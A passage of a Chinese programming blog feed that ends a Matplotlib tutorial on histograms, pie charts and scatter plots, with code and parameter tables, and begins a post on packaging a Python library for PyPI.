punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'人数'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlim<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span>  <span class="token comment"># 设置x轴区间范围，空出一些</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="5-1-2-函数定义"><a href="#5-1-2-函数定义" class="headerlink" title="5.1.2 函数定义"></a>5.1.2 函数定义</h3><code>Matplotlib</code>中绘制直方图的函数是<code>plt.hist()</code>,详细定义如下：</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">hist</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> bins<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">range</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> density<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> weights<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> cumulative<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> bottom<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> histtype<span class="token operator">=</span><span class="token string">'bar'</span><span class="token punctuation">,</span> align<span class="token operator">=</span><span class="token string">'mid'</span><span class="token punctuation">,</span> orientation<span class="token operator">=</span><span class="token string">'vertical'</span><span class="token punctuation">,</span> rwidth<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> log<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> stacked<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">[</span>source<span class="token punctuation">]</span>¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><div class="table-container"><table><thead><tr><th style="text-align:center">参数(加粗为常用参数)</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center"><strong>x</strong></td><td style="text-align:center">输入数据，接受数组或列表</td></tr><tr><td style="text-align:center"><strong>bins</strong></td><td style="text-align:center">区间分布设置(设定一个总区间和区间长度)</td></tr><tr><td style="text-align:center">range</td><td style="text-align:center"><code>bins</code>的上下限，如果没有设置默认为<code>x.min(),x.max()</code></td></tr><tr><td style="text-align:center">density</td><td style="text-align:center">显示统计频率，默认为False，为True则y轴显示频率</td></tr><tr><td style="text-align:center">histtype</td><td style="text-align:center">直方图类型，可选<code>bar</code>(默认),<code>barstacked</code>,<code>step</code>(梯状),<code>stepfilled</code>四种</td></tr><tr><td style="text-align:center">align</td><td style="text-align:center">控制直方图水平分布，可选<code>left</code>,<code>mid</code>(默认),<code>right</code></td></tr></tbody></table></div><blockquote><p>其他参数基本用不到，在需要的时候可查阅<a href="https://matplotlib.org/api/_as_gen/matplotlib.pyplot.hist.html?highlight=hist#matplotlib.pyplot.hist">官方文档</a> </p></blockquote><h3 id="5-1-3-正态分布直方图"><a href="#5-1-3-正态分布直方图" class="headerlink" title="5.1.3 正态分布直方图"></a>5.1.3 正态分布直方图</h3><ul><li><strong>效果</strong><br>  <img src="https://img-blog.csdnimg.cn/20200306112240985.png#pic_center =500x400" style="zoom:50%;" /></li><li><strong>代码</strong>     <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment"># Fixing random state for reproducibility</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">20200306</span><span class="token punctuation">)</span>mu<span class="token punctuation">,</span> sigma <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">20</span>  <span class="token comment"># 均值和方差</span>x <span class="token operator">=</span> mu <span class="token operator">+</span> sigma <span class="token operator">*</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token comment"># the histogram of the data</span>plt<span class="token punctuation">.</span>hist<span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> density<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> facecolor<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.75</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'Smarts'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Probability'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'Histogram of IQ'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">.023</span><span class="token punctuation">,</span> <span class="token string">r'$\mu=50,\ \sigma=20$'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlim<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylim<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0.03</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li></ul><h2 id="5-2-饼状图"><a href="#5-2-饼状图" class="headerlink" title="5.2 饼状图"></a>5.2 饼状图</h2><blockquote><p><strong>适用比例区分</strong>  </p></blockquote><h3 id="5-2-1-简单样例"><a href="#5-2-1-简单样例" class="headerlink" title="5.2.1 简单样例"></a>5.2.1 简单样例</h3><ul><li><p><strong>效果</strong><br>  <img src="https://img-blog.csdnimg.cn/20200306112301635.png#pic_center =500x400" style="zoom:50%;" /></p></li><li><p><strong>代码</strong></p>  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltplt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span> labels <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'语文'</span><span class="token punctuation">,</span><span class="token string">'数学'</span><span class="token punctuation">,</span><span class="token string">'英语'</span><span class="token punctuation">,</span><span class="token string">'物理'</span><span class="token punctuation">)</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">]</span>  <span class="token comment"># 按100比例分配</span>explode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">,</span><span class="token number">0.1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 距离中心距离</span>plt<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>x<span class="token punctuation">,</span>explode<span class="token operator">=</span>explode<span class="token punctuation">,</span>labels<span class="token operator">=</span>labels<span class="token punctuation">,</span>autopct<span class="token operator">=</span><span class="token string">'%.2f'</span><span class="token punctuation">,</span>shadow <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> startangle<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li></ul><h3 id="5-2-2-函数定义"><a href="#5-2-2-函数定义" class="headerlink" title="5.2.2 函数定义"></a>5.2.2 函数定义</h3><p><code>Matplotlib</code>中绘制饼图的函数是<code>plt.pie()</code>，完整的函数定义和参数如下：<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pie</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> explode<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> labels<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> colors<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> autopct<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>pctdistance<span class="token operator">=</span><span class="token number">0.6</span><span class="token punctuation">,</span> shadow<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> labeldistance<span class="token operator">=</span><span class="token number">1.1</span><span class="token punctuation">,</span> startangle<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>radius<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> counterclock<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> wedgeprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> textprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>center<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> frame<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> rotatelabels<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> hold<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></p><div class="table-container"><table><thead><tr><th>参数(加粗为常用参数)</th><th>含义</th></tr></thead><tbody><tr><td><strong>x</strong></td><td>(每一块)的比例，如果sum(x) &gt; 1会使用sum(x)归一化</td></tr><tr><td><strong>explode</strong></td><td>(每一块)离开中心距离</td></tr><tr><td><strong>labels</strong></td><td>(每一块)饼图外侧显示的说明文字</td></tr><tr><td>colors</td><td>自定义颜色，列表，如[‘red’,’yellow’]</td></tr><tr><td><strong>autopct</strong></td><td>控制饼图内百分比设置,可以使用format字符串或者format function</td></tr><tr><td>pctdistance</td><td>类似于labeldistance,指定autopct的位置刻度,默认值为0.6</td></tr><tr><td>shadow</td><td>在饼图下面画一个阴影。默认值：False，即不画阴影</td></tr><tr><td>labeldistance</td><td>label标记的绘制位置,相对于半径的比例，默认值为1.1, 如&lt;1则绘制在饼图内侧</td></tr><tr><td><strong>startangle</strong></td><td>起始绘制角度,默认图是从x轴正方向逆时针画起,如设定=90则从y轴正方向画起</td></tr><tr><td>radius</td><td>控制饼图半径，默认值为1</td></tr><tr><td>counterclock</td><td>指定指针方向；布尔值，可选参数，默认为：True，即逆时针。将值改为False即可改为顺时针</td></tr><tr><td>wedgeprops</td><td>字典类型，可选参数，默认值：None。参数字典传递给wedge对象用来画一个饼图。例如：wedgeprops={‘linewidth’:3}，设置wedge线宽为3</td></tr><tr><td>textprops</td><td>设置标签（labels）和比例文字的格式；字典类型，可选参数，默认值为：None。传递给text对象的字典参数。</td></tr><tr><td>center</td><td>浮点类型的列表，可选参数，默认值：(0,0)。图标中心位置</td></tr><tr><td>frame</td><td>布尔类型，可选参数，默认值：False。如果是true，绘制带有表的轴框架。</td></tr><tr><td>rotatelabels</td><td>布尔类型，可选参数，默认为：False。如果为True，旋转每个label到指定的角度</td></tr></tbody></table></div><h3 id="5-2-3-添加图例"><a href="#5-2-3-添加图例" class="headerlink" title="5.2.3 添加图例"></a>5.2.3 添加图例</h3><ul><li><strong>效果</strong><br>  <img src="https://img-blog.csdnimg.cn/20200306112334659.png#pic_center =500x400" style="zoom:50%;" /></li><li><p><strong>代码</strong>   </p>  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltplt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span> labels <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'语文'</span><span class="token punctuation">,</span><span class="token string">'数学'</span><span class="token punctuation">,</span><span class="token string">'英语'</span><span class="token punctuation">,</span><span class="token string">'物理'</span><span class="token punctuation">)</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">]</span>  <span class="token comment"># 按100比例分配</span>explode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">,</span><span class="token number">0.1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 距离中心距离</span>plt<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>x<span class="token punctuation">,</span>explode<span class="token operator">=</span>explode<span class="token punctuation">,</span>labels<span class="token operator">=</span>labels<span class="token punctuation">,</span>autopct<span class="token operator">=</span><span class="token string">'%.2f%%'</span><span class="token punctuation">,</span>  <span class="token comment"># 添加了百分号</span>shadow <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> startangle<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>axis<span class="token punctuation">(</span><span class="token string">'equal'</span><span class="token punctuation">)</span>  <span class="token comment"># 摆正</span>plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"upper right"</span><span class="token punctuation">,</span> fontsize <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">,</span> bbox_to_anchor<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1.1</span><span class="token punctuation">,</span><span class="token number">1.2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>borderaxespad<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span>  <span class="token comment"># loc :  'upper right' 位于右上角</span><span class="token comment"># bbox_to_anchor: 上边距</span><span class="token comment"># borderaxespad: 图例的内边距</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li></ul><blockquote><p>这里仅给出了常用饼图绘制法，更多详细内容参考<a href="https://www.cnblogs.com/biyoulin/p/9565350.html">matplotlib 知识点11：绘制饼图（pie 函数精讲）</a>  </p></blockquote><h2 id="5-3-散点图"><a href="#5-3-散点图" class="headerlink" title="5.3 散点图"></a>5.3 散点图</h2><blockquote><p><strong>适用数据点分布</strong>  </p></blockquote><p>在对大量数据进行分类的时候采用散点图的方式能够让我们直观地感受到有几种类型。 </p><p>散点图本身也是数据点的集合，因此可以采用<code>plot</code>函数或<code>plt.scatter</code>实现</p><h3 id="5-3-1-简单样例"><a href="#5-3-1-简单样例" class="headerlink" title="5.3.1 简单样例"></a>5.3.1 简单样例</h3><blockquote><p><strong>plot实现</strong></p></blockquote><ul><li><strong>效果</strong><br><img src="https://img-blog.csdnimg.cn/20200306112406269.png#pic_center =500x400" style="zoom:50%;" /></li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npplt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'Scatter'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p><strong>plt.scatter</strong>实现</p><ul><li><strong>效果</strong><br>  <img src="https://img-blog.csdnimg.cn/20200306112429223.png#pic_center =500x400" alt="" style="zoom:50%;" /></li></ul></blockquote><div class="code-wrapper"><pre><code><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>y <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'plt.scatter'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></code></pre><h3 id="5-3-2-函数定义"><a href="#5-3-2-函数定义" class="headerlink" title="5.3.2 函数定义"></a>5.3.2 函数定义</h3><p><code>plt.scatter()</code>函数定义如下：<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">scatter</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> s<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> norm<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> vmin<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> vmax<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>alpha<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> linewidths<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> verts<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> edgecolors<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> hold<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></p><div class="table-container"><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center"><strong>x</strong></td><td style="text-align:center">点横坐标</td></tr><tr><td style="text-align:center"><strong>y</strong></td><td style="text-align:center">点纵坐标(大小与x相等)</td></tr><tr><td style="text-align:center">s</td><td style="text-align:center">标记大小，指定点的大小</td></tr><tr><td style="text-align:center">c</td><td style="text-align:center">标记颜色（如’red’,’r’）</td></tr><tr><td style="text-align:center"><strong>maker</strong></td><td style="text-align:center">标记样式，如’o’是圆圈，’x’是叉号</td></tr><tr><td style="text-align:center"><strong>alpha</strong></td><td style="text-align:center">透明度</td></tr></tbody></table></div><h3 id="5-3-3-多个点集"><a href="#5-3-3-多个点集" class="headerlink" title="5.3.3 多个点集"></a>5.3.3 多个点集</h3><p>散点图中可能有两类或以上不同类型的点，我们需要绘制出来并进行标注对比，这时候采用<code>plt.scatter()</code>函数更方便。</p><ul><li><p><strong>效果</strong><br>  <img src="https://img-blog.csdnimg.cn/20200306112506907.png#pic_center =500x400" style="zoom:50%;" /></p></li><li><p><strong>代码</strong>   </p>  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>y <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>colors <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>c <span class="token operator">=</span> colors<span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'plt.scatter'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>colorbar<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li><li><p><strong><code>Iris</code>数据散点图</strong><br><code>Iris</code>是机器学习分类问题中常用的数据，包含150个数据，共三类，每个数据包含4个属性。我们用散点图绘制这三类数据，看看它们的分布情况。  </p><p><strong>效果</strong>  </p><ul><li><img src="https://img-blog.csdnimg.cn/20200306112526442.png#pic_center =500x400" alt="" style="zoom:50%;" /></li></ul></li></ul><ul><li><strong>代码</strong>    <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>datasets <span class="token keyword">import</span> load_irisiris <span class="token operator">=</span> load_iris<span class="token punctuation">(</span><span class="token punctuation">)</span>features <span class="token operator">=</span> iris<span class="token punctuation">.</span>data<span class="token punctuation">.</span>T  <span class="token comment"># 转置用于单独获取所有特征plt.scatter(features[0],features[1],alpha=0.4,c=iris.target)</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'花萼长度(cm)'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'花萼宽度(cm)'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'Iris数据分布(按照花萼长宽)'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>colorbar<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li></ul><h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h1><p>本文简单地讲述了<code>Matplotlib</code>的使用，以及部分常用图的绘制，更多的内容在后期用到的时候会更新上来。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>matplotlib</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何发布自己的python包到PYPI？给自己编写工具代码</title>
    <link href="/article/50503.html"/>
    <url>/article/50503.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在我编写某一个项目的时候，时常会发现我又用到了之前某个项目中写过的功能，这个时候只能找到以前的项目，将代码copy到新项目中调用。这是一种非常low的做法，一方面，查找以前的代码，费时费力；另一方面，一看就是初学者喜欢干的，作为一个码龄也算有几年的人，还一直满足于以前这种做法，是没有办法进步的。<br><img src="https://img-blog.csdnimg.cn/20200419164648649.png#pic_center =110x100" alt=""><br>网上其实也有许多类似的教程，但总觉得不够简练、友好，很多地方没有解释清楚，因此干脆自己写一个，方便自己也方便他人。</p><h2 id="基础准备"><a href="#基础准备" class="headerlink" title="基础准备"></a>基础准备</h2><p>完成项目创立、工具代码编写、必要文件添加的操作</p><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p>这部分应该都驾轻就熟，可以直接创建一个目录或者用pycharm创建一个新项目，并在新项目下创建一个同名目录，例如我创建一个<code>cptools</code>项目，如下图所示：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuZ2VudGxlY3AuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy81ZTk5NWQ4N2QwMjEyLnBuZw?x-oss-process=image/format,png" alt=""></p><ul><li><strong>为什么要在项目下新建目录而不是直接将代码放在总目录下？</strong><blockquote><p>总目录下除了存放代码外，一般还会存放README，LICENSE以及自动创建的build目录等，因此用这种方式将代码隔离开</p></blockquote></li></ul><h3 id="编写工具代码"><a href="#编写工具代码" class="headerlink" title="编写工具代码"></a>编写工具代码</h3><p>这时候就可以在项目中编写你的个人代码了，通常来说我们代码主要编写为类和函数两种，方便调用。我简单地创建了一个类和函数，放到一个<code>.py</code>文件中，如下图：<br><img src="https://img-blog.csdnimg.cn/20200419164731520.png#pic_center =400x200" alt=""></p><p>同时为了说明这是一个模块，需要添加一个<code>__init__.py</code>文件，我们经常看到一个包直接提供函数的形式，例如<code>requests.get()</code>，而不是<code>requests.utils.get()</code>，是因为在<code>__init__.py</code>中将该目录下所有文件的方法做了导入。如下图所示，我们将<code>hello_cp.py</code>的所有内容导入，这样我们就可以直接用<code>cptools.hello()</code>去调用<code>hello</code>函数了，如下图：<br><img src="https://img-blog.csdnimg.cn/20200419164749953.png#pic_center =400x200" alt=""></p><blockquote><p>name属性是指定包名，和目录一样即可</p></blockquote><h3 id="setup-py"><a href="#setup-py" class="headerlink" title="setup.py"></a>setup.py</h3><p>这个文件是用于告诉setuptools我们项目的版本号等信息的，创建在项目总目录下即可，如下所示：</p><p><img src="https://img-blog.csdnimg.cn/20200419164805629.png#pic_center =400x300" alt=""></p><h3 id="LICENSE"><a href="#LICENSE" class="headerlink" title="LICENSE"></a>LICENSE</h3><p>LICENSE在<code>github</code>上创建之初可以选择，如下图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuZ2VudGxlY3AuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy81ZjI1MDBkZTUwOTI5LnBuZw#pic_center =618x590" alt=""><br>不同的开源协议包含不同的开源要求，具体可自己查询，一般我建议采用<code>GNU v3.0</code></p><h3 id="README-md"><a href="#README-md" class="headerlink" title="README.md"></a>README.md</h3><p>这部分是对整个项目的描述，可以编写对项目的介绍，这个时候你的目录应该和我下图显示的类似<br><img src="https://img-blog.csdnimg.cn/20200419164837863.png#pic_center =400x150" alt=""></p><h2 id="打包发布到PYPI"><a href="#打包发布到PYPI" class="headerlink" 